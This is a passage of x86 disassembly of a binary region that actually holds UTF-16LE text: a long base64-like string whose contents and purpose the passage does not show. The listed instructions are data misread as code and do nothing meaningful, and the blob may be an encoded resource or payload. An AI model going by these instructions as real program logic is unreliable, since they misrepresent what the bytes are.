  403658:	00 57 00             	add    %dl,0x0(%edi)
  40365b:	74 00                	je     0x40365d
  40365d:	37                   	aaa
  40365e:	00 4e 00             	add    %cl,0x0(%esi)
  403661:	78 00                	js     0x403663
  403663:	64 00 54 00 70       	add    %dl,%fs:0x70(%eax,%eax,1)
  403668:	00 31                	add    %dh,(%ecx)
  40366a:	00 71 00             	add    %dh,0x0(%ecx)
  40366d:	4a                   	dec    %edx
  40366e:	00 67 00             	add    %ah,0x0(%edi)
  403671:	4c                   	dec    %esp
  403672:	00 34 00             	add    %dh,(%eax,%eax,1)
  403675:	77 00                	ja     0x403677
  403677:	6a 00                	push   $0x0
  403679:	6e                   	outsb  %ds:(%esi),(%dx)
  40367a:	00 42 00             	add    %al,0x0(%edx)
  40367d:	50                   	push   %eax
  40367e:	00 55 00             	add    %dl,0x0(%ebp)
  403681:	5a                   	pop    %edx
  403682:	00 31                	add    %dh,(%ecx)
  403684:	00 41 00             	add    %al,0x0(%ecx)
  403687:	2b 00                	sub    (%eax),%eax
  403689:	44                   	inc    %esp
  40368a:	00 42 00             	add    %al,0x0(%edx)
  40368d:	54                   	push   %esp
  40368e:	00 6a 00             	add    %ch,0x0(%edx)
  403691:	47                   	inc    %edi
  403692:	00 6f 00             	add    %ch,0x0(%edi)
  403695:	48                   	dec    %eax
  403696:	00 33                	add    %dh,(%ebx)
  403698:	00 73 00             	add    %dh,0x0(%ebx)
  40369b:	6a 00                	push   $0x0
  40369d:	69 00 6b 00 6a 00    	imul   $0x6a006b,(%eax),%eax
  4036a3:	59                   	pop    %ecx
  4036a4:	00 32                	add    %dh,(%edx)
  4036a6:	00 71 00             	add    %dh,0x0(%ecx)
  4036a9:	37                   	aaa
  4036aa:	00 34 00             	add    %dh,(%eax,%eax,1)
  4036ad:	2f                   	das
  4036ae:	00 6f 00             	add    %ch,0x0(%edi)
  4036b1:	54                   	push   %esp
  4036b2:	00 32                	add    %dh,(%edx)
  4036b4:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  4036b8:	00 33                	add    %dh,(%ebx)
  4036ba:	00 73 00             	add    %dh,0x0(%ebx)
  4036bd:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  4036c1:	68 00 4c 00 45       	push   $0x45004c00
  4036c6:	00 6a 00             	add    %ch,0x0(%edx)
  4036c9:	31 00                	xor    %eax,(%eax)
  4036cb:	50                   	push   %eax
  4036cc:	00 67 00             	add    %ah,0x0(%edi)
  4036cf:	53                   	push   %ebx
  4036d0:	00 6e 00             	add    %ch,0x0(%esi)
  4036d3:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  4036d7:	79 00                	jns    0x4036d9
  4036d9:	33 00                	xor    (%eax),%eax
  4036db:	43                   	inc    %ebx
  4036dc:	00 4f 00             	add    %cl,0x0(%edi)
  4036df:	63 00                	arpl   %eax,(%eax)
  4036e1:	62 00                	bound  %eax,(%eax)
  4036e3:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4036e7:	5a                   	pop    %edx
  4036e8:	00 49 00             	add    %cl,0x0(%ecx)
  4036eb:	4e                   	dec    %esi
  4036ec:	00 73 00             	add    %dh,0x0(%ebx)
  4036ef:	4b                   	dec    %ebx
  4036f0:	00 55 00             	add    %dl,0x0(%ebp)
  4036f3:	4a                   	dec    %edx
  4036f4:	00 37                	add    %dh,(%edi)
  4036f6:	00 37                	add    %dh,(%edi)
  4036f8:	00 79 00             	add    %bh,0x0(%ecx)
  4036fb:	47                   	inc    %edi
  4036fc:	00 63 00             	add    %ah,0x0(%ebx)
  4036ff:	38 00                	cmp    %al,(%eax)
  403701:	33 00                	xor    (%eax),%eax
  403703:	55                   	push   %ebp
  403704:	00 53 00             	add    %dl,0x0(%ebx)
  403707:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40370b:	4c                   	dec    %esp
  40370c:	00 4e 00             	add    %cl,0x0(%esi)
  40370f:	78 00                	js     0x403711
  403711:	50                   	push   %eax
  403712:	00 4d 00             	add    %cl,0x0(%ebp)
  403715:	30 00                	xor    %al,(%eax)
  403717:	71 00                	jno    0x403719
  403719:	61                   	popa
  40371a:	00 33                	add    %dh,(%ebx)
  40371c:	00 53 00             	add    %dl,0x0(%ebx)
  40371f:	52                   	push   %edx
  403720:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  403724:	00 59 00             	add    %bl,0x0(%ecx)
  403727:	52                   	push   %edx
  403728:	00 7a 00             	add    %bh,0x0(%edx)
  40372b:	59                   	pop    %ecx
  40372c:	00 7a 00             	add    %bh,0x0(%edx)
  40372f:	42                   	inc    %edx
  403730:	00 72 00             	add    %dh,0x0(%edx)
  403733:	62 00                	bound  %eax,(%eax)
  403735:	58                   	pop    %eax
  403736:	00 52 00             	add    %dl,0x0(%edx)
  403739:	50                   	push   %eax
  40373a:	00 75 00             	add    %dh,0x0(%ebp)
  40373d:	70 00                	jo     0x40373f
  40373f:	38 00                	cmp    %al,(%eax)
  403741:	41                   	inc    %ecx
  403742:	00 58 00             	add    %bl,0x0(%eax)
  403745:	51                   	push   %ecx
  403746:	00 4f 00             	add    %cl,0x0(%edi)
  403749:	32 00                	xor    (%eax),%al
  40374b:	72 00                	jb     0x40374d
  40374d:	56                   	push   %esi
  40374e:	00 49 00             	add    %cl,0x0(%ecx)
  403751:	38 00                	cmp    %al,(%eax)
  403753:	63 00                	arpl   %eax,(%eax)
  403755:	59                   	pop    %ecx
  403756:	00 70 00             	add    %dh,0x0(%eax)
  403759:	4a                   	dec    %edx
  40375a:	00 78 00             	add    %bh,0x0(%eax)
  40375d:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  403761:	70 00                	jo     0x403763
  403763:	39 00                	cmp    %eax,(%eax)
  403765:	47                   	inc    %edi
  403766:	00 72 00             	add    %dh,0x0(%edx)
  403769:	55                   	push   %ebp
  40376a:	00 67 00             	add    %ah,0x0(%edi)
  40376d:	73 00                	jae    0x40376f
  40376f:	63 00                	arpl   %eax,(%eax)
  403771:	64 00 33             	add    %dh,%fs:(%ebx)
  403774:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  403778:	00 4d 00             	add    %cl,0x0(%ebp)
  40377b:	73 00                	jae    0x40377d
  40377d:	74 00                	je     0x40377f
  40377f:	57                   	push   %edi
  403780:	00 78 00             	add    %bh,0x0(%eax)
  403783:	6f                   	outsl  %ds:(%esi),(%dx)
  403784:	00 56 00             	add    %dl,0x0(%esi)
  403787:	6f                   	outsl  %ds:(%esi),(%dx)
  403788:	00 2b                	add    %ch,(%ebx)
  40378a:	00 47 00             	add    %al,0x0(%edi)
  40378d:	69 00 49 00 4d 00    	imul   $0x4d0049,(%eax),%eax
  403793:	31 00                	xor    %eax,(%eax)
  403795:	56                   	push   %esi
  403796:	00 4d 00             	add    %cl,0x0(%ebp)
  403799:	4b                   	dec    %ebx
  40379a:	00 47 00             	add    %al,0x0(%edi)
  40379d:	4d                   	dec    %ebp
  40379e:	00 47 00             	add    %al,0x0(%edi)
  4037a1:	35 00 71 00 74       	xor    $0x74007100,%eax
  4037a6:	00 33                	add    %dh,(%ebx)
  4037a8:	00 48 00             	add    %cl,0x0(%eax)
  4037ab:	31 00                	xor    %eax,(%eax)
  4037ad:	73 00                	jae    0x4037af
  4037af:	47                   	inc    %edi
  4037b0:	00 38                	add    %bh,(%eax)
  4037b2:	00 4a 00             	add    %cl,0x0(%edx)
  4037b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4037b6:	00 7a 00             	add    %bh,0x0(%edx)
  4037b9:	33 00                	xor    (%eax),%eax
  4037bb:	5a                   	pop    %edx
  4037bc:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  4037c0:	00 65 00             	add    %ah,0x0(%ebp)
  4037c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c4:	00 53 00             	add    %dl,0x0(%ebx)
  4037c7:	6b 00 41             	imul   $0x41,(%eax),%eax
  4037ca:	00 6f 00             	add    %ch,0x0(%edi)
  4037cd:	47                   	inc    %edi
  4037ce:	00 4b 00             	add    %cl,0x0(%ebx)
  4037d1:	31 00                	xor    %eax,(%eax)
  4037d3:	59                   	pop    %ecx
  4037d4:	00 70 00             	add    %dh,0x0(%eax)
  4037d7:	74 00                	je     0x4037d9
  4037d9:	4c                   	dec    %esp
  4037da:	00 51 00             	add    %dl,0x0(%ecx)
  4037dd:	4b                   	dec    %ebx
  4037de:	00 43 00             	add    %al,0x0(%ebx)
  4037e1:	34 00                	xor    $0x0,%al
  4037e3:	74 00                	je     0x4037e5
  4037e5:	73 00                	jae    0x4037e7
  4037e7:	41                   	inc    %ecx
  4037e8:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  4037ec:	00 58 00             	add    %bl,0x0(%eax)
  4037ef:	31 00                	xor    %eax,(%eax)
  4037f1:	68 00 52 00 2f       	push   $0x2f005200
  4037f6:	00 4d 00             	add    %cl,0x0(%ebp)
  4037f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4037fa:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  4037fe:	00 39                	add    %bh,(%ecx)
  403800:	00 62 00             	add    %ah,0x0(%edx)
  403803:	33 00                	xor    (%eax),%eax
  403805:	58                   	pop    %eax
  403806:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  40380a:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40380e:	00 4a 00             	add    %cl,0x0(%edx)
  403811:	39 00                	cmp    %eax,(%eax)
  403813:	6b 00 78             	imul   $0x78,(%eax),%eax
  403816:	00 57 00             	add    %dl,0x0(%edi)
  403819:	54                   	push   %esp
  40381a:	00 77 00             	add    %dh,0x0(%edi)
  40381d:	50                   	push   %eax
  40381e:	00 4a 00             	add    %cl,0x0(%edx)
  403821:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  403825:	70 00                	jo     0x403827
  403827:	4f                   	dec    %edi
  403828:	00 50 00             	add    %dl,0x0(%eax)
  40382b:	4b                   	dec    %ebx
  40382c:	00 76 00             	add    %dh,0x0(%esi)
  40382f:	6b 00 65             	imul   $0x65,(%eax),%eax
  403832:	00 30                	add    %dh,(%eax)
  403834:	00 72 00             	add    %dh,0x0(%edx)
  403837:	7a 00                	jp     0x403839
  403839:	74 00                	je     0x40383b
  40383b:	47                   	inc    %edi
  40383c:	00 42 00             	add    %al,0x0(%edx)
  40383f:	54                   	push   %esp
  403840:	00 75 00             	add    %dh,0x0(%ebp)
  403843:	6f                   	outsl  %ds:(%esi),(%dx)
  403844:	00 68 00             	add    %ch,0x0(%eax)
  403847:	71 00                	jno    0x403849
  403849:	6e                   	outsb  %ds:(%esi),(%dx)
  40384a:	00 58 00             	add    %bl,0x0(%eax)
  40384d:	47                   	inc    %edi
  40384e:	00 2f                	add    %ch,(%edi)
  403850:	00 31                	add    %dh,(%ecx)
  403852:	00 70 00             	add    %dh,0x0(%eax)
  403855:	6a 00                	push   $0x0
  403857:	53                   	push   %ebx
  403858:	00 6f 00             	add    %ch,0x0(%edi)
  40385b:	61                   	popa
  40385c:	00 63 00             	add    %ah,0x0(%ebx)
  40385f:	41                   	inc    %ecx
  403860:	00 46 00             	add    %al,0x0(%esi)
  403863:	4a                   	dec    %edx
  403864:	00 5a 00             	add    %bl,0x0(%edx)
  403867:	73 00                	jae    0x403869
  403869:	6a 00                	push   $0x0
  40386b:	72 00                	jb     0x40386d
  40386d:	7a 00                	jp     0x40386f
  40386f:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  403873:	43                   	inc    %ebx
  403874:	00 58 00             	add    %bl,0x0(%eax)
  403877:	70 00                	jo     0x403879
  403879:	64 00 4c 00 62       	add    %cl,%fs:0x62(%eax,%eax,1)
  40387e:	00 31                	add    %dh,(%ecx)
  403880:	00 73 00             	add    %dh,0x0(%ebx)
  403883:	43                   	inc    %ebx
  403884:	00 42 00             	add    %al,0x0(%edx)
  403887:	69 00 2b 00 4b 00    	imul   $0x4b002b,(%eax),%eax
  40388d:	31 00                	xor    %eax,(%eax)
  40388f:	44                   	inc    %esp
  403890:	00 36                	add    %dh,(%esi)
  403892:	00 37                	add    %dh,(%edi)
  403894:	00 56 00             	add    %dl,0x0(%esi)
  403897:	51                   	push   %ecx
  403898:	00 70 00             	add    %dh,0x0(%eax)
  40389b:	71 00                	jno    0x40389d
  40389d:	2b 00                	sub    (%eax),%eax
  40389f:	59                   	pop    %ecx
  4038a0:	00 78 00             	add    %bh,0x0(%eax)
  4038a3:	41                   	inc    %ecx
  4038a4:	00 4f 00             	add    %cl,0x0(%edi)
  4038a7:	43                   	inc    %ebx
  4038a8:	00 39                	add    %bh,(%ecx)
  4038aa:	00 32                	add    %dh,(%edx)
  4038ac:	00 62 00             	add    %ah,0x0(%edx)
  4038af:	4b                   	dec    %ebx
  4038b0:	00 67 00             	add    %ah,0x0(%edi)
  4038b3:	56                   	push   %esi
  4038b4:	00 39                	add    %bh,(%ecx)
  4038b6:	00 56 00             	add    %dl,0x0(%esi)
  4038b9:	4c                   	dec    %esp
  4038ba:	00 6d 00             	add    %ch,0x0(%ebp)
  4038bd:	61                   	popa
  4038be:	00 47 00             	add    %al,0x0(%edi)
  4038c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c2:	00 39                	add    %bh,(%ecx)
  4038c4:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  4038c8:	00 2f                	add    %ch,(%edi)
  4038ca:	00 65 00             	add    %ah,0x0(%ebp)
  4038cd:	4f                   	dec    %edi
  4038ce:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  4038d2:	00 41 00             	add    %al,0x0(%ecx)
  4038d5:	52                   	push   %edx
  4038d6:	00 2f                	add    %ch,(%edi)
  4038d8:	00 2f                	add    %ch,(%edi)
  4038da:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  4038de:	00 69 00             	add    %ch,0x0(%ecx)
  4038e1:	2f                   	das
  4038e2:	00 6f 00             	add    %ch,0x0(%edi)
  4038e5:	59                   	pop    %ecx
  4038e6:	00 67 00             	add    %ah,0x0(%edi)
  4038e9:	76 00                	jbe    0x4038eb
  4038eb:	36 00 36             	add    %dh,%ss:(%esi)
  4038ee:	00 45 00             	add    %al,0x0(%ebp)
  4038f1:	69 00 45 00 69 00    	imul   $0x690045,(%eax),%eax
  4038f7:	31 00                	xor    %eax,(%eax)
  4038f9:	4f                   	dec    %edi
  4038fa:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  4038fe:	00 73 00             	add    %dh,0x0(%ebx)
  403901:	47                   	inc    %edi
  403902:	00 62 00             	add    %ah,0x0(%edx)
  403905:	52                   	push   %edx
  403906:	00 58 00             	add    %bl,0x0(%eax)
  403909:	66 00 74 00 47       	data16 add %dh,0x47(%eax,%eax,1)
  40390e:	00 65 00             	add    %ah,0x0(%ebp)
  403911:	51                   	push   %ecx
  403912:	00 70 00             	add    %dh,0x0(%eax)
  403915:	6e                   	outsb  %ds:(%esi),(%dx)
  403916:	00 70 00             	add    %dh,0x0(%eax)
  403919:	78 00                	js     0x40391b
  40391b:	77 00                	ja     0x40391d
  40391d:	6d                   	insl   (%dx),%es:(%edi)
  40391e:	00 67 00             	add    %ah,0x0(%edi)
  403921:	6a 00                	push   $0x0
  403923:	72 00                	jb     0x403925
  403925:	44                   	inc    %esp
  403926:	00 73 00             	add    %dh,0x0(%ebx)
  403929:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40392d:	4d                   	dec    %ebp
  40392e:	00 33                	add    %dh,(%ebx)
  403930:	00 53 00             	add    %dl,0x0(%ebx)
  403933:	4a                   	dec    %edx
  403934:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  403938:	00 78 00             	add    %bh,0x0(%eax)
  40393b:	2b 00                	sub    (%eax),%eax
  40393d:	38 00                	cmp    %al,(%eax)
  40393f:	73 00                	jae    0x403941
  403941:	50                   	push   %eax
  403942:	00 56 00             	add    %dl,0x0(%esi)
  403945:	58                   	pop    %eax
  403946:	00 4e 00             	add    %cl,0x0(%esi)
  403949:	66 00 32             	data16 add %dh,(%edx)
  40394c:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  403950:	00 39                	add    %bh,(%ecx)
  403952:	00 70 00             	add    %dh,0x0(%eax)
  403955:	68 00 71 00 2f       	push   $0x2f007100
  40395a:	00 57 00             	add    %dl,0x0(%edi)
  40395d:	58                   	pop    %eax
  40395e:	00 73 00             	add    %dh,0x0(%ebx)
  403961:	56                   	push   %esi
  403962:	00 48 00             	add    %cl,0x0(%eax)
  403965:	6a 00                	push   $0x0
  403967:	55                   	push   %ebp
  403968:	00 30                	add    %dh,(%eax)
  40396a:	00 2f                	add    %ch,(%edi)
  40396c:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  403970:	00 4a 00             	add    %cl,0x0(%edx)
  403973:	33 00                	xor    (%eax),%eax
  403975:	78 00                	js     0x403977
  403977:	52                   	push   %edx
  403978:	00 51 00             	add    %dl,0x0(%ecx)
  40397b:	45                   	inc    %ebp
  40397c:	00 6b 00             	add    %ch,0x0(%ebx)
  40397f:	39 00                	cmp    %eax,(%eax)
  403981:	6d                   	insl   (%dx),%es:(%edi)
  403982:	00 62 00             	add    %ah,0x0(%edx)
  403985:	4b                   	dec    %ebx
  403986:	00 69 00             	add    %ch,0x0(%ecx)
  403989:	2b 00                	sub    (%eax),%eax
  40398b:	54                   	push   %esp
  40398c:	00 70 00             	add    %dh,0x0(%eax)
  40398f:	5a                   	pop    %edx
  403990:	00 77 00             	add    %dh,0x0(%edi)
  403993:	75 00                	jne    0x403995
  403995:	36 00 32             	add    %dh,%ss:(%edx)
  403998:	00 6f 00             	add    %ch,0x0(%edi)
  40399b:	2f                   	das
  40399c:	00 31                	add    %dh,(%ecx)
  40399e:	00 47 00             	add    %al,0x0(%edi)
  4039a1:	34 00                	xor    $0x0,%al
  4039a3:	74 00                	je     0x4039a5
  4039a5:	46                   	inc    %esi
  4039a6:	00 68 00             	add    %ch,0x0(%eax)
  4039a9:	56                   	push   %esi
  4039aa:	00 47 00             	add    %al,0x0(%edi)
  4039ad:	62 00                	bound  %eax,(%eax)
  4039af:	79 00                	jns    0x4039b1
  4039b1:	75 00                	jne    0x4039b3
  4039b3:	69 00 46 00 50 00    	imul   $0x500046,(%eax),%eax
  4039b9:	56                   	push   %esi
  4039ba:	00 59 00             	add    %bl,0x0(%ecx)
  4039bd:	45                   	inc    %ebp
  4039be:	00 38                	add    %bh,(%eax)
  4039c0:	00 78 00             	add    %bh,0x0(%eax)
  4039c3:	7a 00                	jp     0x4039c5
  4039c5:	45                   	inc    %ebp
  4039c6:	00 30                	add    %dh,(%eax)
  4039c8:	00 66 00             	add    %ah,0x0(%esi)
  4039cb:	61                   	popa
  4039cc:	00 70 00             	add    %dh,0x0(%eax)
  4039cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d0:	00 42 00             	add    %al,0x0(%edx)
  4039d3:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  4039d6:	00 67 00             	add    %ah,0x0(%edi)
  4039d9:	6d                   	insl   (%dx),%es:(%edi)
  4039da:	00 79 00             	add    %bh,0x0(%ecx)
  4039dd:	34 00                	xor    $0x0,%al
  4039df:	33 00                	xor    (%eax),%eax
  4039e1:	68 00 50 00 67       	push   $0x67005000
  4039e6:	00 30                	add    %dh,(%eax)
  4039e8:	00 45 00             	add    %al,0x0(%ebp)
  4039eb:	6a 00                	push   $0x0
  4039ed:	6d                   	insl   (%dx),%es:(%edi)
  4039ee:	00 69 00             	add    %ch,0x0(%ecx)
  4039f1:	75 00                	jne    0x4039f3
  4039f3:	57                   	push   %edi
  4039f4:	00 58 00             	add    %bl,0x0(%eax)
  4039f7:	4d                   	dec    %ebp
  4039f8:	00 4f 00             	add    %cl,0x0(%edi)
  4039fb:	56                   	push   %esi
  4039fc:	00 53 00             	add    %dl,0x0(%ebx)
  4039ff:	31 00                	xor    %eax,(%eax)
  403a01:	46                   	inc    %esi
  403a02:	00 4d 00             	add    %cl,0x0(%ebp)
  403a05:	59                   	pop    %ecx
  403a06:	00 42 00             	add    %al,0x0(%edx)
  403a09:	73 00                	jae    0x403a0b
  403a0b:	6b 00 48             	imul   $0x48,(%eax),%eax
  403a0e:	00 58 00             	add    %bl,0x0(%eax)
  403a11:	6d                   	insl   (%dx),%es:(%edi)
  403a12:	00 65 00             	add    %ah,0x0(%ebp)
  403a15:	37                   	aaa
  403a16:	00 6f 00             	add    %ch,0x0(%edi)
  403a19:	34 00                	xor    $0x0,%al
  403a1b:	6e                   	outsb  %ds:(%esi),(%dx)
  403a1c:	00 50 00             	add    %dl,0x0(%eax)
  403a1f:	6a 00                	push   $0x0
  403a21:	7a 00                	jp     0x403a23
  403a23:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  403a27:	38 00                	cmp    %al,(%eax)
  403a29:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  403a2d:	4c                   	dec    %esp
  403a2e:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  403a32:	00 5a 00             	add    %bl,0x0(%edx)
  403a35:	50                   	push   %eax
  403a36:	00 4b 00             	add    %cl,0x0(%ebx)
  403a39:	6d                   	insl   (%dx),%es:(%edi)
  403a3a:	00 76 00             	add    %dh,0x0(%esi)
  403a3d:	34 00                	xor    $0x0,%al
  403a3f:	39 00                	cmp    %eax,(%eax)
  403a41:	52                   	push   %edx
  403a42:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  403a46:	00 70 00             	add    %dh,0x0(%eax)
  403a49:	33 00                	xor    (%eax),%eax
  403a4b:	63 00                	arpl   %eax,(%eax)
  403a4d:	45                   	inc    %ebp
  403a4e:	00 47 00             	add    %al,0x0(%edi)
  403a51:	6a 00                	push   $0x0
  403a53:	70 00                	jo     0x403a55
  403a55:	42                   	inc    %edx
  403a56:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  403a5a:	00 35 00 33 00 2b    	add    %dh,0x2b003300
  403a60:	00 34 00             	add    %dh,(%eax,%eax,1)
  403a63:	39 00                	cmp    %eax,(%eax)
  403a65:	4a                   	dec    %edx
  403a66:	00 4d 00             	add    %cl,0x0(%ebp)
  403a69:	45                   	inc    %ebp
  403a6a:	00 56 00             	add    %dl,0x0(%esi)
  403a6d:	50                   	push   %eax
  403a6e:	00 39                	add    %bh,(%ecx)
  403a70:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  403a74:	00 59 00             	add    %bl,0x0(%ecx)
  403a77:	2f                   	das
  403a78:	00 73 00             	add    %dh,0x0(%ebx)
  403a7b:	75 00                	jne    0x403a7d
  403a7d:	75 00                	jne    0x403a7f
  403a7f:	37                   	aaa
  403a80:	00 46 00             	add    %al,0x0(%esi)
  403a83:	30 00                	xor    %al,(%eax)
  403a85:	53                   	push   %ebx
  403a86:	00 55 00             	add    %dl,0x0(%ebp)
  403a89:	49                   	dec    %ecx
  403a8a:	00 45 00             	add    %al,0x0(%ebp)
  403a8d:	53                   	push   %ebx
  403a8e:	00 34 00             	add    %dh,(%eax,%eax,1)
  403a91:	53                   	push   %ebx
  403a92:	00 55 00             	add    %dl,0x0(%ebp)
  403a95:	74 00                	je     0x403a97
  403a97:	4f                   	dec    %edi
  403a98:	00 59 00             	add    %bl,0x0(%ecx)
  403a9b:	4f                   	dec    %edi
  403a9c:	00 6e 00             	add    %ch,0x0(%esi)
  403a9f:	79 00                	jns    0x403aa1
  403aa1:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  403aa5:	45                   	inc    %ebp
  403aa6:	00 46 00             	add    %al,0x0(%esi)
  403aa9:	66 00 33             	data16 add %dh,(%ebx)
  403aac:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  403ab0:	00 4f 00             	add    %cl,0x0(%edi)
  403ab3:	71 00                	jno    0x403ab5
  403ab5:	57                   	push   %edi
  403ab6:	00 68 00             	add    %ch,0x0(%eax)
  403ab9:	6d                   	insl   (%dx),%es:(%edi)
  403aba:	00 33                	add    %dh,(%ebx)
  403abc:	00 37                	add    %dh,(%edi)
  403abe:	00 56 00             	add    %dl,0x0(%esi)
  403ac1:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  403ac5:	69 00 43 00 63 00    	imul   $0x630043,(%eax),%eax
  403acb:	57                   	push   %edi
  403acc:	00 47 00             	add    %al,0x0(%edi)
  403acf:	51                   	push   %ecx
  403ad0:	00 6e 00             	add    %ch,0x0(%esi)
  403ad3:	2f                   	das
  403ad4:	00 62 00             	add    %ah,0x0(%edx)
  403ad7:	45                   	inc    %ebp
  403ad8:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  403adc:	00 51 00             	add    %dl,0x0(%ecx)
  403adf:	38 00                	cmp    %al,(%eax)
  403ae1:	68 00 4b 00 65       	push   $0x65004b00
  403ae6:	00 43 00             	add    %al,0x0(%ebx)
  403ae9:	78 00                	js     0x403aeb
  403aeb:	35 00 43 00 7a       	xor    $0x7a004300,%eax
  403af0:	00 31                	add    %dh,(%ecx)
  403af2:	00 62 00             	add    %ah,0x0(%edx)
  403af5:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  403af9:	4f                   	dec    %edi
  403afa:	00 78 00             	add    %bh,0x0(%eax)
  403afd:	59                   	pop    %ecx
  403afe:	00 37                	add    %dh,(%edi)
  403b00:	00 2b                	add    %ch,(%ebx)
  403b02:	00 2f                	add    %ch,(%edi)
  403b04:	00 71 00             	add    %dh,0x0(%ecx)
  403b07:	4d                   	dec    %ebp
  403b08:	00 59 00             	add    %bl,0x0(%ecx)
  403b0b:	4f                   	dec    %edi
  403b0c:	00 69 00             	add    %ch,0x0(%ecx)
  403b0f:	58                   	pop    %eax
  403b10:	00 4d 00             	add    %cl,0x0(%ebp)
  403b13:	47                   	inc    %edi
  403b14:	00 4d 00             	add    %cl,0x0(%ebp)
  403b17:	52                   	push   %edx
  403b18:	00 6e 00             	add    %ch,0x0(%esi)
  403b1b:	79 00                	jns    0x403b1d
  403b1d:	47                   	inc    %edi
  403b1e:	00 33                	add    %dh,(%ebx)
  403b20:	00 4e 00             	add    %cl,0x0(%esi)
  403b23:	4f                   	dec    %edi
  403b24:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  403b28:	00 70 00             	add    %dh,0x0(%eax)
  403b2b:	44                   	inc    %esp
  403b2c:	00 6e 00             	add    %ch,0x0(%esi)
  403b2f:	4f                   	dec    %edi
  403b30:	00 79 00             	add    %bh,0x0(%ecx)
  403b33:	74 00                	je     0x403b35
  403b35:	62 00                	bound  %eax,(%eax)
  403b37:	6c                   	insb   (%dx),%es:(%edi)
  403b38:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  403b3c:	00 37                	add    %dh,(%edi)
  403b3e:	00 69 00             	add    %ch,0x0(%ecx)
  403b41:	56                   	push   %esi
  403b42:	00 50 00             	add    %dl,0x0(%eax)
  403b45:	68 00 50 00 53       	push   $0x53005000
  403b4a:	00 58 00             	add    %bl,0x0(%eax)
  403b4d:	41                   	inc    %ecx
  403b4e:	00 39                	add    %bh,(%ecx)
  403b50:	00 4b 00             	add    %cl,0x0(%ebx)
  403b53:	34 00                	xor    $0x0,%al
  403b55:	51                   	push   %ecx
  403b56:	00 47 00             	add    %al,0x0(%edi)
  403b59:	70 00                	jo     0x403b5b
  403b5b:	67 00 6d 00          	add    %ch,0x0(%di)
  403b5f:	54                   	push   %esp
  403b60:	00 75 00             	add    %dh,0x0(%ebp)
  403b63:	54                   	push   %esp
  403b64:	00 69 00             	add    %ch,0x0(%ecx)
  403b67:	2b 00                	sub    (%eax),%eax
  403b69:	35 00 61 00 53       	xor    $0x53006100,%eax
  403b6e:	00 53 00             	add    %dl,0x0(%ebx)
  403b71:	67 00 4e 00          	add    %cl,0x0(%bp)
  403b75:	4d                   	dec    %ebp
  403b76:	00 59 00             	add    %bl,0x0(%ecx)
  403b79:	54                   	push   %esp
  403b7a:	00 39                	add    %bh,(%ecx)
  403b7c:	00 72 00             	add    %dh,0x0(%edx)
  403b7f:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  403b83:	53                   	push   %ebx
  403b84:	00 56 00             	add    %dl,0x0(%esi)
  403b87:	38 00                	cmp    %al,(%eax)
  403b89:	62 00                	bound  %eax,(%eax)
  403b8b:	36 00 64 00 43       	add    %ah,%ss:0x43(%eax,%eax,1)
  403b90:	00 4e 00             	add    %cl,0x0(%esi)
  403b93:	50                   	push   %eax
  403b94:	00 71 00             	add    %dh,0x0(%ecx)
  403b97:	4a                   	dec    %edx
  403b98:	00 4d 00             	add    %cl,0x0(%ebp)
  403b9b:	6a 00                	push   $0x0
  403b9d:	52                   	push   %edx
  403b9e:	00 66 00             	add    %ah,0x0(%esi)
  403ba1:	66 00 38             	data16 add %bh,(%eax)
  403ba4:	00 72 00             	add    %dh,0x0(%edx)
  403ba7:	68 00 46 00 62       	push   $0x62004600
  403bac:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  403bb0:	00 66 00             	add    %ah,0x0(%esi)
  403bb3:	57                   	push   %edi
  403bb4:	00 67 00             	add    %ah,0x0(%edi)
  403bb7:	51                   	push   %ecx
  403bb8:	00 75 00             	add    %dh,0x0(%ebp)
  403bbb:	49                   	dec    %ecx
  403bbc:	00 2f                	add    %ch,(%edi)
  403bbe:	00 50 00             	add    %dl,0x0(%eax)
  403bc1:	6c                   	insb   (%dx),%es:(%edi)
  403bc2:	00 6d 00             	add    %ch,0x0(%ebp)
  403bc5:	73 00                	jae    0x403bc7
  403bc7:	6a 00                	push   $0x0
  403bc9:	32 00                	xor    (%eax),%al
  403bcb:	57                   	push   %edi
